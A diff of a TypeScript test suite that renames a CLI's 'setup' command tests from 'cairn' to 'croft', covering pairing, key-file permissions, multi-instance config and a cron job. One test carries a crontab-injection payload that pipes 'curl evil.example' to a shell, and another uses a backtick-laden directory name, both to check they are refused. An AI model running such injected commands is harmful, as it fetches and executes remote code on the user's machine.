@@ -7,11 +7,11 @@ import { join } from 'node:path'
 import { spawn } from 'node:child_process'
 
 /**
- * `cairn setup` (CAIRN-314): one command that connects a machine to a Cairn
+ * `croft setup` (CROFT-314): one command that connects a machine to a Croft
  * instance and installs everything the four scripts used to do by hand. This
  * exercises the CLI half against a fake server that speaks the pairing
  * contract exactly (connect / connect/poll / health / people), never the
- * real GitHub download — CAIRN_SETUP_SOURCE points at this checkout instead,
+ * real GitHub download — CROFT_SETUP_SOURCE points at this checkout instead,
  * which is also what makes the test hermetic and fast.
  *
  * Every non-dry-run case passes --no-hooks --no-jobs: install-cron.mjs's
@@ -21,7 +21,7 @@ import { spawn } from 'node:child_process'
  */
 
 const REPO = process.cwd()
-const CLI = join(REPO, 'cli', 'cairn.mjs')
+const CLI = join(REPO, 'cli', 'croft.mjs')
 
 const servers: Server[] = []
 const homes: string[] = []
@@ -45,7 +45,7 @@ type ConnectState = {
   requests?: { runtimes: string[]; host: string }[]
 }
 
-/** A fake Cairn server: health, people (key validity), connect, connect/poll. */
+/** A fake Croft server: health, people (key validity), connect, connect/poll. */
 const serve = (state: ConnectState = {}) =>
   new Promise<string>((resolve) => {
     let polls = 0
@@ -97,19 +97,19 @@ const serve = (state: ConnectState = {}) =>
   })
 
 const home = async () => {
-  const dir = await mkdtemp(join(tmpdir(), 'cairn-setup-'))
+  const dir = await mkdtemp(join(tmpdir(), 'croft-setup-'))
   homes.push(dir)
   return dir
 }
 
-const RUNTIME_MARKERS = /^(CLAUDECODE|CLAUDE_CODE_|CODEX_|OPENCLAW_|CAIRN_AGENT$|CAIRN_SESSION_ID$)/
+const RUNTIME_MARKERS = /^(CLAUDECODE|CLAUDE_CODE_|CODEX_|OPENCLAW_|CROFT_AGENT$|CROFT_SESSION_ID$)/
 
 const run = (args: string[], HOME: string, extraEnv: Record<string, string> = {}) => {
   const env = { ...process.env }
   for (const name of Object.keys(env)) if (RUNTIME_MARKERS.test(name)) delete env[name]
   return new Promise<{ code: number | null; stdout: string; stderr: string }>((resolve, reject) => {
     const child = spawn('node', [CLI, ...args], {
-      env: { ...env, HOME, CAIRN_SETUP_SOURCE: REPO, ...extraEnv },
+      env: { ...env, HOME, CROFT_SETUP_SOURCE: REPO, ...extraEnv },
       stdio: ['ignore', 'pipe', 'pipe'],
     })
     let stdout = ''
@@ -121,17 +121,17 @@ const run = (args: string[], HOME: string, extraEnv: Record<string, string> = {}
   })
 }
 
-describe('cairn setup — dry run', () => {
+describe('croft setup — dry run', () => {
   it('prints the plan and writes nothing', async () => {
     const base = await serve()
     const HOME = await home()
     const { code, stdout } = await run(['setup', '--url', base, '--runtimes', 'claude-code', '--dry-run'], HOME)
     expect(code).toBe(0)
-    expect(stdout).toContain('would write CAIRN_BASE_URL')
+    expect(stdout).toContain('would write CROFT_BASE_URL')
     expect(stdout).toContain(`✓ server    ${base}`)
     expect(stdout).toContain('would be paired (--dry-run: skipped)')
-    expect(existsSync(join(HOME, '.cairn', 'env'))).toBe(false)
-    expect(existsSync(join(HOME, '.local', 'bin', 'cairn'))).toBe(false)
+    expect(existsSync(join(HOME, '.croft', 'env'))).toBe(false)
+    expect(existsSync(join(HOME, '.local', 'bin', 'croft'))).toBe(false)
   })
 
   it('offers OpenClaw only where this account runs its gateway', async () => {
@@ -161,21 +161,21 @@ describe('cairn setup — dry run', () => {
 })
 
 /**
- * CAIRN-316: OpenClaw has no session-end event, so `openclaw-sessions`
+ * CROFT-316: OpenClaw has no session-end event, so `openclaw-sessions`
  * (scripts/install-cron.mjs) is the only thing that ever records its
- * transcripts — `cairn setup` installs it for you wherever it can work out
+ * transcripts — `croft setup` installs it for you wherever it can work out
  * the sessions directory. Dry-run only here: --install would run real
  * launchctl, which this suite must never do.
  */
-describe('cairn setup — openclaw-sessions job', () => {
+describe('croft setup — openclaw-sessions job', () => {
   it('includes openclaw-sessions with the derived directory when it can find one', async () => {
     const base = await serve()
     const HOME = await home()
     const { mkdir, writeFile } = await import('node:fs/promises')
     const sessions = join(HOME, '.openclaw', 'agents', 'main', 'agent', 'codex-home', 'sessions')
     await mkdir(sessions, { recursive: true })
-    await mkdir(join(HOME, '.cairn', 'hooks'), { recursive: true })
-    await writeFile(join(HOME, '.cairn', 'hooks', 'cairn-session-end.mjs'), '// stub\n')
+    await mkdir(join(HOME, '.croft', 'hooks'), { recursive: true })
+    await writeFile(join(HOME, '.croft', 'hooks', 'croft-session-end.mjs'), '// stub\n')
 
     const { code, stdout } = await run(
       ['setup', '--url', base, '--runtimes', 'openclaw', '--no-hooks', '--dry-run'],
@@ -195,24 +195,24 @@ describe('cairn setup — openclaw-sessions job', () => {
     )
     expect(code).toBe(0)
     expect(stdout).toContain('! jobs      openclaw-sessions skipped')
-    expect(stdout).toContain('set CAIRN_OPENCLAW_SESSIONS=<dir> and re-run')
-    expect(stdout).toContain('CAIRN_OPENCLAW_SESSIONS=')
+    expect(stdout).toContain('set CROFT_OPENCLAW_SESSIONS=<dir> and re-run')
+    expect(stdout).toContain('CROFT_OPENCLAW_SESSIONS=')
     expect(stdout).not.toContain('agent-files, openclaw-sessions')
   })
 
-  it('honours an already-set CAIRN_OPENCLAW_SESSIONS instead of deriving one', async () => {
+  it('honours an already-set CROFT_OPENCLAW_SESSIONS instead of deriving one', async () => {
     const base = await serve()
     const HOME = await home()
     const { mkdir, writeFile } = await import('node:fs/promises')
     const custom = join(HOME, 'custom-sessions')
     await mkdir(custom, { recursive: true })
-    await mkdir(join(HOME, '.cairn', 'hooks'), { recursive: true })
-    await writeFile(join(HOME, '.cairn', 'hooks', 'cairn-session-end.mjs'), '// stub\n')
+    await mkdir(join(HOME, '.croft', 'hooks'), { recursive: true })
+    await writeFile(join(HOME, '.croft', 'hooks', 'croft-session-end.mjs'), '// stub\n')
 
     const { code, stdout } = await run(
       ['setup', '--url', base, '--runtimes', 'openclaw', '--no-hooks', '--dry-run'],
       HOME,
-      { CAIRN_OPENCLAW_SESSIONS: custom },
+      { CROFT_OPENCLAW_SESSIONS: custom },
     )
     expect(code).toBe(0)
     expect(stdout).toContain('jobs      agent-files, openclaw-sessions (plan)')
@@ -251,8 +251,8 @@ describe('cairn setup — openclaw-sessions job', () => {
     const sessions = join(HOME, '.openclaw', 'agents', 'work-agent.1', 'agent', 'codex-home', 'sessions')
     await mkdir(sessions, { recursive: true })
     await mkdir(join(HOME, '.openclaw', 'agents', 'evil`id`', 'agent', 'codex-home', 'sessions'), { recursive: true })
-    await mkdir(join(HOME, '.cairn', 'hooks'), { recursive: true })
-    await writeFile(join(HOME, '.cairn', 'hooks', 'cairn-session-end.mjs'), '// stub\n')
+    await mkdir(join(HOME, '.croft', 'hooks'), { recursive: true })
+    await writeFile(join(HOME, '.croft', 'hooks', 'croft-session-end.mjs'), '// stub\n')
 
     const { code, stdout } = await run(
       ['setup', '--url', base, '--runtimes', 'openclaw', '--no-hooks', '--dry-run'],
@@ -268,20 +268,20 @@ describe('cairn setup — openclaw-sessions job', () => {
    * from carrying a `%` (cron's own newline escape, crontab(5)) or an actual
    * newline before it ever reaches install-cron.mjs's rendering.
    */
-  it('refuses a CAIRN_OPENCLAW_SESSIONS override that could forge a crontab line', async () => {
+  it('refuses a CROFT_OPENCLAW_SESSIONS override that could forge a crontab line', async () => {
     const base = await serve()
     const HOME = await home()
     const { code, stdout, stderr } = await run(
       ['setup', '--url', base, '--runtimes', 'openclaw', '--no-hooks', '--dry-run'],
       HOME,
-      { CAIRN_OPENCLAW_SESSIONS: '/tmp/x%* * * * * curl evil.example|sh' },
+      { CROFT_OPENCLAW_SESSIONS: '/tmp/x%* * * * * curl evil.example|sh' },
     )
     expect(code).toBe(0) // setup itself still finishes; the failing sub-step is reported, not fatal
-    expect(`${stdout}${stderr}`).toContain('CAIRN_OPENCLAW_SESSIONS contains a newline, carriage return or %')
+    expect(`${stdout}${stderr}`).toContain('CROFT_OPENCLAW_SESSIONS contains a newline, carriage return or %')
   })
 })
 
-describe('cairn setup — pairing', () => {
+describe('croft setup — pairing', () => {
   it('pairs, prints who approved it, and writes the key at mode 600', async () => {
     const base = await serve({ status: 'pending', pendingCount: 1, keys: [{ agentName: 'claude-code', key: 'sk_new' }], user: { name: 'Julien' } })
     const HOME = await home()
@@ -294,9 +294,9 @@ describe('cairn setup — pairing', () => {
     expect(stdout).toContain('AB12-CD34')
     expect(stdout).toContain('✓ approved by Julien')
 
-    const envPath = join(HOME, '.cairn', 'env')
+    const envPath = join(HOME, '.croft', 'env')
     const content = await readFile(envPath, 'utf8')
-    expect(content).toContain('CAIRN_API_KEY_CLAUDE_CODE=sk_new')
+    expect(content).toContain('CROFT_API_KEY_CLAUDE_CODE=sk_new')
     const mode = (await stat(envPath)).mode & 0o777
     expect(mode).toBe(0o600)
   })
@@ -333,23 +333,23 @@ describe('cairn setup — pairing', () => {
     expect(code).toBe(0)
     expect(stdout).toContain('this server predates pairing')
     expect(stdout).toContain(`${base}/users`)
-    expect(stdout).toContain('CAIRN_API_KEY_CLAUDE_CODE=')
+    expect(stdout).toContain('CROFT_API_KEY_CLAUDE_CODE=')
     // It continues with the rest of setup rather than stopping dead.
-    expect(existsSync(join(HOME, '.local', 'bin', 'cairn'))).toBe(true)
+    expect(existsSync(join(HOME, '.local', 'bin', 'croft'))).toBe(true)
   })
 
   it('tightens an env file that already existed with looser permissions', async () => {
     const base = await serve({ status: 'approved', keys: [{ agentName: 'claude-code', key: 'sk_new' }] })
     const HOME = await home()
     const { mkdir, writeFile, chmod } = await import('node:fs/promises')
-    await mkdir(join(HOME, '.cairn'), { recursive: true })
-    const envPath = join(HOME, '.cairn', 'env')
-    await writeFile(envPath, `CAIRN_BASE_URL=${base}\n`)
+    await mkdir(join(HOME, '.croft'), { recursive: true })
+    const envPath = join(HOME, '.croft', 'env')
+    await writeFile(envPath, `CROFT_BASE_URL=${base}\n`)
     await chmod(envPath, 0o644)
     const { code } = await run(['setup', '--url', base, '--runtimes', 'claude-code', '--no-hooks', '--no-jobs'], HOME)
     expect(code).toBe(0)
     expect((await stat(envPath)).mode & 0o777).toBe(0o600)
-    expect((await stat(join(HOME, '.cairn'))).mode & 0o777).toBe(0o700)
+    expect((await stat(join(HOME, '.croft'))).mode & 0o777).toBe(0o700)
   })
 
   it('pairs a maintenance key on its own, so a member still gets their agents\' keys', async () => {
@@ -369,17 +369,17 @@ describe('cairn setup — pairing', () => {
     expect(requests.map((r) => r.runtimes)).toEqual([['claude-code'], ['maintenance']])
     expect(requests[0]!.host).toMatch(/^[A-Za-z0-9._-]+$/)
     expect(stdout).toContain('maintenance not issued')
-    expect(await readFile(join(HOME, '.cairn', 'env'), 'utf8')).toContain('CAIRN_API_KEY_CLAUDE_CODE=sk_member')
+    expect(await readFile(join(HOME, '.croft', 'env'), 'utf8')).toContain('CROFT_API_KEY_CLAUDE_CODE=sk_member')
   })
 
   it('replaces a stale key in place rather than duplicating the line', async () => {
     const base = await serve({ status: 'approved', keys: [{ agentName: 'claude-code', key: 'sk_fresh' }] })
     const HOME = await home()
     const { mkdir, writeFile } = await import('node:fs/promises')
-    await mkdir(join(HOME, '.cairn'), { recursive: true, mode: 0o700 })
+    await mkdir(join(HOME, '.croft'), { recursive: true, mode: 0o700 })
     await writeFile(
-      join(HOME, '.cairn', 'env'),
-      `CAIRN_BASE_URL=${base}\n# a comment, kept\nCAIRN_API_KEY_CLAUDE_CODE=sk_stale\n`,
+      join(HOME, '.croft', 'env'),
+      `CROFT_BASE_URL=${base}\n# a comment, kept\nCROFT_API_KEY_CLAUDE_CODE=sk_stale\n`,
       { mode: 0o600 },
     )
     const { code } = await run(
@@ -387,9 +387,9 @@ describe('cairn setup — pairing', () => {
       HOME,
     )
     expect(code).toBe(0)
-    const content = await readFile(join(HOME, '.cairn', 'env'), 'utf8')
-    expect(content.match(/CAIRN_API_KEY_CLAUDE_CODE=/g)).toHaveLength(1)
-    expect(content).toContain('CAIRN_API_KEY_CLAUDE_CODE=sk_fresh')
+    const content = await readFile(join(HOME, '.croft', 'env'), 'utf8')
+    expect(content.match(/CROFT_API_KEY_CLAUDE_CODE=/g)).toHaveLength(1)
+    expect(content).toContain('CROFT_API_KEY_CLAUDE_CODE=sk_fresh')
     expect(content).not.toContain('sk_stale')
     expect(content).toContain('# a comment, kept')
   })
@@ -398,10 +398,10 @@ describe('cairn setup — pairing', () => {
     const base = await serve()
     const HOME = await home()
     const { mkdir, writeFile } = await import('node:fs/promises')
-    await mkdir(join(HOME, '.cairn'), { recursive: true, mode: 0o700 })
+    await mkdir(join(HOME, '.croft'), { recursive: true, mode: 0o700 })
     await writeFile(
-      join(HOME, '.cairn', 'env'),
-      `CAIRN_BASE_URL=${base}\nCAIRN_API_KEY_CLAUDE_CODE=sk_valid\n`,
+      join(HOME, '.croft', 'env'),
+      `CROFT_BASE_URL=${base}\nCROFT_API_KEY_CLAUDE_CODE=sk_valid\n`,
       { mode: 0o600 },
     )
     const { code, stdout } = await run(
@@ -414,7 +414,7 @@ describe('cairn setup — pairing', () => {
   })
 })
 
-describe('cairn setup — idempotent re-run', () => {
+describe('croft setup — idempotent re-run', () => {
   it('a second run keeps the key and reports the cli/skill as unchanged', async () => {
     const base = await serve({ status: 'approved', keys: [{ agentName: 'claude-code', key: 'sk_valid' }] })
     const HOME = await home()
@@ -429,41 +429,41 @@ describe('cairn setup — idempotent re-run', () => {
     expect(second.stdout).toContain('cli') // unchanged line still names the step
     expect(second.stdout).toContain('unchanged')
 
-    const content = await readFile(join(HOME, '.cairn', 'env'), 'utf8')
-    expect(content.match(/CAIRN_API_KEY_CLAUDE_CODE=/g)).toHaveLength(1)
+    const content = await readFile(join(HOME, '.croft', 'env'), 'utf8')
+    expect(content.match(/CROFT_API_KEY_CLAUDE_CODE=/g)).toHaveLength(1)
   })
 })
 
-describe('cairn setup — multi-instance naming', () => {
+describe('croft setup — multi-instance naming', () => {
   it('derives a name from the url, skipping generic host labels', async () => {
     const HOME = await home()
     const { mkdir, writeFile } = await import('node:fs/promises')
-    await mkdir(join(HOME, '.cairn'), { recursive: true, mode: 0o700 })
-    await writeFile(join(HOME, '.cairn', 'env'), 'CAIRN_BASE_URL=https://old.example.com\n', { mode: 0o600 })
+    await mkdir(join(HOME, '.croft'), { recursive: true, mode: 0o700 })
+    await writeFile(join(HOME, '.croft', 'env'), 'CROFT_BASE_URL=https://old.example.com\n', { mode: 0o600 })
 
     const base = await serve()
     // The fake server is on 127.0.0.1:<port>, which has no meaningful labels
     // to skip, so it derives to its own first label; the point of this case
     // is that a *different* url than the one on disk triggers multi-instance
-    // mode and registers a name rather than overwriting ~/.cairn/env.
+    // mode and registers a name rather than overwriting ~/.croft/env.
     const { code, stdout } = await run(
       ['setup', '--url', base, '--runtimes', 'claude-code', '--dry-run'],
       HOME,
     )
     expect(code).toBe(0)
     expect(stdout).toContain('would register')
-    expect(existsSync(join(HOME, '.cairn', 'instances.json'))).toBe(false) // dry-run changed nothing
-    const untouched = await readFile(join(HOME, '.cairn', 'env'), 'utf8')
+    expect(existsSync(join(HOME, '.croft', 'instances.json'))).toBe(false) // dry-run changed nothing
+    const untouched = await readFile(join(HOME, '.croft', 'env'), 'utf8')
     expect(untouched).toContain('old.example.com')
   })
 
   it('adopts the existing single instance before adding a second, so the first keeps working', async () => {
     const HOME = await home()
     const { mkdir, writeFile } = await import('node:fs/promises')
-    await mkdir(join(HOME, '.cairn'), { recursive: true, mode: 0o700 })
+    await mkdir(join(HOME, '.croft'), { recursive: true, mode: 0o700 })
     await writeFile(
-      join(HOME, '.cairn', 'env'),
-      'CAIRN_BASE_URL=https://tasks.example.com\nCAIRN_API_KEY_CLAUDE_CODE=sk_first\n',
+      join(HOME, '.croft', 'env'),
+      'CROFT_BASE_URL=https://tasks.example.com\nCROFT_API_KEY_CLAUDE_CODE=sk_first\n',
       { mode: 0o600 },
     )
     const base = await serve({ status: 'approved', keys: [{ agentName: 'claude-code', key: 'sk_second' }] })
@@ -472,21 +472,21 @@ describe('cairn setup — multi-instance naming', () => {
       HOME,
     )
     expect(code).toBe(0)
-    expect(stdout).toContain('adopted from ~/.cairn/env, still the default')
+    expect(stdout).toContain('adopted from ~/.croft/env, still the default')
 
-    const config = JSON.parse(await readFile(join(HOME, '.cairn', 'instances.json'), 'utf8'))
+    const config = JSON.parse(await readFile(join(HOME, '.croft', 'instances.json'), 'utf8'))
     expect(Object.keys(config.instances).sort()).toEqual(['tasks', 'work'])
     expect(config.instances.tasks.url).toBe('https://tasks.example.com')
     expect(config.unclassified).toEqual({ mode: 'default', instance: 'tasks' })
-    expect(await readFile(join(HOME, '.cairn', 'instances', 'tasks', 'env'), 'utf8')).toContain('sk_first')
-    expect(await readFile(join(HOME, '.cairn', 'instances', 'work', 'env'), 'utf8')).toContain('sk_second')
+    expect(await readFile(join(HOME, '.croft', 'instances', 'tasks', 'env'), 'utf8')).toContain('sk_first')
+    expect(await readFile(join(HOME, '.croft', 'instances', 'work', 'env'), 'utf8')).toContain('sk_second')
   })
 
   it('--name overrides the derived name', async () => {
     const HOME = await home()
     const { mkdir, writeFile } = await import('node:fs/promises')
-    await mkdir(join(HOME, '.cairn'), { recursive: true, mode: 0o700 })
-    await writeFile(join(HOME, '.cairn', 'env'), 'CAIRN_BASE_URL=https://old.example.com\n', { mode: 0o600 })
+    await mkdir(join(HOME, '.croft'), { recursive: true, mode: 0o700 })
+    await writeFile(join(HOME, '.croft', 'env'), 'CROFT_BASE_URL=https://old.example.com\n', { mode: 0o600 })
 
     const base = await serve({ status: 'approved', keys: [{ agentName: 'claude-code', key: 'sk_new' }] })
     const { code, stdout } = await run(
@@ -495,16 +495,16 @@ describe('cairn setup — multi-instance naming', () => {
     )
     expect(code).toBe(0)
     expect(stdout).toContain('work ->')
-    const instances = JSON.parse(await readFile(join(HOME, '.cairn', 'instances.json'), 'utf8'))
+    const instances = JSON.parse(await readFile(join(HOME, '.croft', 'instances.json'), 'utf8'))
     expect(instances.instances.work.url).toBe(base)
-    const envPath = join(HOME, '.cairn', 'instances', 'work', 'env')
+    const envPath = join(HOME, '.croft', 'instances', 'work', 'env')
     expect(existsSync(envPath)).toBe(true)
     const content = await readFile(envPath, 'utf8')
-    expect(content).toContain('CAIRN_API_KEY_CLAUDE_CODE=sk_new')
+    expect(content).toContain('CROFT_API_KEY_CLAUDE_CODE=sk_new')
   })
 })
 
-describe('cairn setup — CAIRN_SETUP_SOURCE', () => {
+describe('croft setup — CROFT_SETUP_SOURCE', () => {
   it('installs the cli and skill straight from the local checkout, no download attempted', async () => {
     const base = await serve({ status: 'approved', keys: [{ agentName: 'claude-code', key: 'sk_new' }] })
     const HOME = await home()
@@ -513,12 +513,12 @@ describe('cairn setup — CAIRN_SETUP_SOURCE', () => {
       HOME,
     )
     expect(code).toBe(0)
-    expect(stdout).toContain(`${REPO} (CAIRN_SETUP_SOURCE)`)
-    const installed = await readFile(join(HOME, '.local', 'bin', 'cairn'), 'utf8')
+    expect(stdout).toContain(`${REPO} (CROFT_SETUP_SOURCE)`)
+    const installed = await readFile(join(HOME, '.local', 'bin', 'croft'), 'utf8')
     const source = await readFile(CLI, 'utf8')
     expect(installed).toBe(source)
-    expect(existsSync(join(HOME, '.claude', 'skills', 'cairn', 'SKILL.md'))).toBe(true)
-    // No release was fetched from GitHub or cached under ~/.cairn/releases.
-    expect(existsSync(join(HOME, '.cairn', 'releases'))).toBe(false)
+    expect(existsSync(join(HOME, '.claude', 'skills', 'croft', 'SKILL.md'))).toBe(true)
+    // No release was fetched from GitHub or cached under ~/.croft/releases.
+    expect(existsSync(join(HOME, '.croft', 'releases'))).toBe(false)
   })
 })
